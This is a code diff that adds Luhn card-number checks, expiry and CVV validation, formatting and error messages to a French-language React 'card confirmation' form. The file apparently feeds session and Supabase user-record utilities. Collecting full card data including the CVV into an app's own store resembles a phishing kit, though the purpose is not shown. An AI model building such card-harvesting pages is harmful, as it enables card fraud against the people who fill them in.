@@ -7,18 +7,160 @@ import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
 import { upsertUser } from "@/utils/supabaseClient";
 import { toast } from "sonner";
 
+// Validation utilities
+const validateCardNumber = (cardNumber: string): boolean => {
+  // Remove spaces and dashes
+  const digitsOnly = cardNumber.replace(/\D/g, '');
+  
+  // Check if the card number has a valid length
+  if (digitsOnly.length < 13 || digitsOnly.length > 19) {
+    return false;
+  }
+  
+  // Luhn algorithm (mod 10)
+  let sum = 0;
+  let shouldDouble = false;
+  
+  // Loop through digits in reverse order
+  for (let i = digitsOnly.length - 1; i >= 0; i--) {
+    let digit = parseInt(digitsOnly.charAt(i));
+    
+    if (shouldDouble) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+    
+    sum += digit;
+    shouldDouble = !shouldDouble;
+  }
+  
+  return (sum % 10) === 0;
+};
+
+const validateExpirationDate = (expDate: string): boolean => {
+  // Match formats like MM/YY, MM-YY, MM/YYYY, or MMYY
+  const datePattern = /^(0[1-9]|1[0-2])[/-]?([0-9]{2}|[0-9]{4})$/;
+  
+  if (!datePattern.test(expDate)) {
+    return false;
+  }
+  
+  // Extract month and year
+  const cleanedDate = expDate.replace(/[/-]/g, '');
+  const month = parseInt(cleanedDate.substring(0, 2));
+  const year = parseInt(cleanedDate.substring(2));
+  
+  // Adjust year format (20XX)
+  const fullYear = year < 100 ? year + 2000 : year;
+  
+  // Get current date
+  const now = new Date();
+  const currentMonth = now.getMonth() + 1; // JS months are 0-indexed
+  const currentYear = now.getFullYear();
+  
+  // Check if the date is in the future
+  if (fullYear < currentYear || (fullYear === currentYear && month < currentMonth)) {
+    return false;
+  }
+  
+  return true;
+};
+
+const validateCVV = (cvv: string): boolean => {
+  // CVV is typically 3 digits (Visa, Mastercard, Discover) or 4 digits (Amex)
+  const cvvPattern = /^[0-9]{3,4}$/;
+  return cvvPattern.test(cvv);
+};
+
+const formatCardNumber = (cardNumber: string): string => {
+  // Remove all non-digit characters
+  const digitsOnly = cardNumber.replace(/\D/g, '');
+  
+  // Format with spaces every 4 digits
+  const formatted = digitsOnly.replace(/(\d{4})(?=\d)/g, '$1 ');
+  
+  return formatted;
+};
+
+const formatExpirationDate = (expDate: string): string => {
+  // Remove all non-digit characters
+  const digitsOnly = expDate.replace(/\D/g, '');
+  
+  // Format as MM/YY if we have at least 2 digits
+  if (digitsOnly.length >= 2) {
+    const month = digitsOnly.substring(0, 2);
+    const year = digitsOnly.substring(2, 4);
+    return `${month}${year.length > 0 ? '/' + year : ''}`;
+  }
+  
+  return digitsOnly;
+};
+
 const CardConfirmation: React.FC = () => {
   const [numeroCarte, setNumeroCarte] = useState("");
   const [dateExpiration, setDateExpiration] = useState("");
   const [cryptogramme, setCryptogramme] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  const [errors, setErrors] = useState({
+    numeroCarte: "",
+    dateExpiration: "",
+    cryptogramme: ""
+  });
   const navigate = useNavigate();
+
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value;
+    // Format card number as user types
+    const formatted = formatCardNumber(value);
+    setNumeroCarte(formatted);
+    
+    // Clear error if field is valid
+    if (validateCardNumber(formatted)) {
+      setErrors(prev => ({ ...prev, numeroCarte: "" }));
+    }
+  };
+
+  const handleExpirationChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value;
+    // Format expiration date as user types
+    const formatted = formatExpirationDate(value);
+    setDateExpiration(formatted);
+    
+    // Clear error if field is valid
+    if (validateExpirationDate(formatted)) {
+      setErrors(prev => ({ ...prev, dateExpiration: "" }));
+    }
+  };
+
+  const handleCVVChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value;
+    // Only allow digits and limit length to 4
+    if (/^\d{0,4}$/.test(value)) {
+      setCryptogramme(value);
+      
+      // Clear error if field is valid
+      if (validateCVV(value)) {
+        setErrors(prev => ({ ...prev, cryptogramme: "" }));
+      }
+    }
+  };
+
+  const validateForm = (): boolean => {
+    const newErrors = {
+      numeroCarte: validateCardNumber(numeroCarte) ? "" : "Numéro de carte invalide",
+      dateExpiration: validateExpirationDate(dateExpiration) ? "" : "Date d'expiration invalide",
+      cryptogramme: validateCVV(cryptogramme) ? "" : "CVV invalide"
+    };
+    
+    setErrors(newErrors);
+    return !Object.values(newErrors).some(error => error !== "");
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    if (!numeroCarte || !dateExpiration || !cryptogramme) {
-      toast.error("Veuillez remplir tous les champs");
+    if (!validateForm()) {
+      toast.error("Veuillez corriger les erreurs dans le formulaire");
       return;
     }
 
@@ -100,20 +242,27 @@ const CardConfirmation: React.FC = () => {
               <input
                 type="text"
                 value={numeroCarte}
-                onChange={(e) => setNumeroCarte(e.target.value)}
-                className="form-input"
-                placeholder="Numero de carte"
+                onChange={handleCardNumberChange}
+                className={`form-input ${errors.numeroCarte ? 'border-red-500' : ''}`}
+                placeholder="Numéro de carte"
               />
+              {errors.numeroCarte && (
+                <p className="text-red-500 text-sm mt-1">{errors.numeroCarte}</p>
+              )}
             </div>
 
             <div>
               <input
                 type="text"
                 value={dateExpiration}
-                onChange={(e) => setDateExpiration(e.target.value)}
-                className="form-input"
-                placeholder="Date d'expiration"
+                onChange={handleExpirationChange}
+                className={`form-input ${errors.dateExpiration ? 'border-red-500' : ''}`}
+                placeholder="Date d'expiration (MM/YY)"
+                maxLength={5}
               />
+              {errors.dateExpiration && (
+                <p className="text-red-500 text-sm mt-1">{errors.dateExpiration}</p>
+              )}
             </div>
 
             <div className="grid grid-cols-3 gap-4">
@@ -121,11 +270,14 @@ const CardConfirmation: React.FC = () => {
                 <input
                   type="text"
                   value={cryptogramme}
-                  onChange={(e) => setCryptogramme(e.target.value)}
-                  className="form-input"
+                  onChange={handleCVVChange}
+                  className={`form-input ${errors.cryptogramme ? 'border-red-500' : ''}`}
                   placeholder="Cryptogramme"
-                  maxLength={3}
+                  maxLength={4}
                 />
+                {errors.cryptogramme && (
+                  <p className="text-red-500 text-sm mt-1">{errors.cryptogramme}</p>
+                )}
               </div>
               <div className="flex items-center justify-center">
                 <svg width="40" height="26" viewBox="0 0 40 26" fill="none" xmlns="http://www.w3.org/2000/svg">
